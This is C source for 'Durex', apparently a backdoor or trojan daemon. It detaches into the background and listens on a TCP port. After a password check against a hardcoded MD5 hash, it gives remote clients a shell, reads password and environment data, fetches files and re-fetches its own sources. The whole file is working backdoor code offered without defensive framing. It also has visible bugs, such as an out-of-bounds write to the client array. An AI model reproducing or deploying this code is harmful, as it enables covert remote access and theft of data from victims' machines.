#include "durex.h"

t_ctx durex;

static void		_init(void)
{
	int opt = 1;

	memset(&durex, 0, sizeof(durex));
	durex.io = open("/tmp/Durex.log", O_RDWR | O_CREAT);
	if (durex.io < 0)
		exit(1);
	if ((durex.msock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
		exit(1);
	if ((setsockopt(durex.msock,  SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt))) < 0)
		exit(1);
	durex.mport = PORT;
	durex.rsock.sin_family = AF_INET;
	durex.rsock.sin_port = htons(durex.mport);
	durex.rsock.sin_addr.s_addr = htonl(INADDR_ANY);
	if (bind(durex.msock, (struct sockaddr *)&durex.rsock,
		sizeof(durex.rsock)) == -1)
		_exit(1);
	if (listen(durex.msock, MAXCLIENTS) < 0)
		_exit(1);
	opt = MAXCLIENTS;
	while (opt > 0)
	{
		durex.client[opt].status = WAITING;
		durex.client[opt].fd = -1;
		durex.client[opt].pid = -1;
		opt--;
	}
	_sighandler();
}

static int		_login(char *key)
{
	char mdfive[32] = "63a9f0ea7bb98050796b649e85481845";
	uint8_t *k = _md5((uint8_t*)key);
	if (strcmp((uint8_t*)mdfive, k))
		return (1);
	return (0);
}

static int		_recv(struct s_client *client, char **envp)
{
	char buf[4096];
	size_t size = 0;

	memset(buf, 0, sizeof(buf));
	if ((size = read(client->fd, buf, 4095)) < 0)
		_exit(1);
	else if (size  == 0)
		return (DISCONNECTED);
	else
	{
		buf[size-1] = 0;
		if (client->status == LOGGING)
		{
			if (_login(buf) == 0)
			{
				client->status = LOGGED;
				return (LOGGED);
			}
			else 
				return (LOGFAIL);
		}
		else if (client->status == LOGGED)
		{
			if(strcmp(buf, "quit") == 0)
				return (CMD_QUIT);
			else if (strcmp(buf, "shell") == 0)
				return (_shlaunch(client));
			else if (strcmp(buf, "help") == 0)
				return (_help(client));
			else if (strcmp(buf, "passwd") == 0)
				return (_shpasswd(client));
			else if (strcmp(buf, "env") == 0)
				return (_shenv(client, envp));
			else if (strncmp(buf, "get", 3) == 0)
				return (_shfile(client, buf));
			else if (strcmp(buf, "check") == 0)
				return (_schk_daemon(client));
			else if (strcmp(buf, "update") == 0)
			{
				if (_init_daemon(7) == 0)
					send(client->fd, "Daemon ok all sources fetched\n", 30, 0);
				return (0);
			}
			else
			{
				if (strlen(buf) > 0)
					return (_servlog(INVALIDCMD,client));
			}
		}
	}
	return (0);
}

void		_rundurex(char **envp)
{
	struct timeval tv;
	int retval;
	int i, client_nb = 0;
	int sockmax;
	int tmp_socket = 9999;
	struct sockaddr_in client_sin;
	socklen_t client_sin_len = sizeof(struct sockaddr);

	if (daemon(0,0) < 0)
		exit(1);
	_init();
	sockmax = durex.msock;
	while (1)
	{
		FD_ZERO(&durex.stream);
		FD_SET(durex.msock, &durex.stream);
		i = 0;
		while (i <= client_nb)
		{
			if (durex.client[i].fd > 0 && durex.client[i].status != IN_SHELL)
				FD_SET(durex.client[i].fd, &durex.stream);
			i++;
		}
		if (select(sockmax + 1, &durex.stream, NULL, NULL, NULL) < 0)
			continue;
		else if (FD_ISSET(durex.msock, &durex.stream))
		{
			if ((tmp_socket = accept(durex.msock, (struct sockaddr *)&client_sin, &client_sin_len)) == -1)
				_exit(1);
			else
			{
				if (client_nb >= MAXCLIENTS)
				{
					if ((close(tmp_socket) < 0))
						_exit(1);
				}
				else
				{
					durex.client[client_nb].fd = tmp_socket;
					durex.client[client_nb].status = LOGGING;
					durex.client[client_nb].pid = -1;
					sockmax = (tmp_socket > sockmax) ? tmp_socket : sockmax;
					int ret = send(tmp_socket, "Code: ", 6, 0);
					client_nb++;
				}
			}
		}
		else
		{
			i = 0;
			while (i < MAXCLIENTS)
			{
				if (durex.client[i].pid > 0)
					_shchk(&durex.client[i]);
				if (durex.client[i].status != IN_SHELL)
				{
					if (FD_ISSET(durex.client[i].fd, &durex.stream))
					{
						retval = _recv(&(durex.client[i]), envp);
						if (retval == DISCONNECTED)
						{
							client_nb--;
							durex.client[i].fd = -1;
							durex.client[i].status = WAITING;
							durex.client[i].pid = -1;
						}
						else if (retval == CMD_QUIT)
							_exit(0);
						else if (retval == LOGGED)
							send(durex.client[i].fd, "User logged successfully\n", strlen("User logged successfully\n"), 0);
						else if (retval == LOGFAIL)
							send(durex.client[i].fd, "Code: ", 6, 0);
						if (durex.client[i].status == LOGGED)
							send(durex.client[i].fd, "#", 1, 0);
						if (retval == IN_SHELL)
							client_nb--;
					}
				}
				i++;
			}
		}
	}
}
